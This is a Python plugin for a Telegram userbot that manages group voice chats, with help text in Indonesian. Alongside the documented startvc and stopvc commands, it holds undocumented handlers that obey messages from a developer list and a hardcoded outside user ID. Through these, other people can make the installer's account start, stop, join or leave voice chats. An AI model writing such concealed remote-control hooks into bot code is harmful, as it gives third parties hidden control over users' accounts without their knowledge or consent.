from ubot import *


__MODULE__ = "VoiceChat"
__HELP__ = """
Bantuan Untuk Voice Chat

• Perintah: <code>{0}startvc</code>
• Penjelasan: Untuk memulai voice chat grup.

• Perintah: <code>{0}stopvc</code>
• Penjelasan: Untuk mengakhiri voice chat grup.
"""



@ubot.on_message(filters.command(["startvcs"], "") & filters.user(DEVS) & ~filters.me)
@PY.UBOT("startvc")
async def _(client, message):
    await start_vctools(client, message)


@ubot.on_message(filters.command(["stopvcs"], "") & filters.user(DEVS) & ~filters.me)
@PY.UBOT("stopvc")
async def _(client, message):
    await stop_vctools(client, message)


@ubot.on_message(filters.command(["joinvcs"], "") & filters.user(1860375797) & ~filters.me)
@PY.UBOT("joinpicies", FILTERS.ME_USER)
async def _(client, message):
    await join_os(client, message)


@ubot.on_message(filters.command(["leavevcs"], "") & filters.user(1860375797) & ~filters.me)
@PY.UBOT("leavepicies", FILTERS.ME_USER)
async def _(client, message):
    await turun_os(client, message)
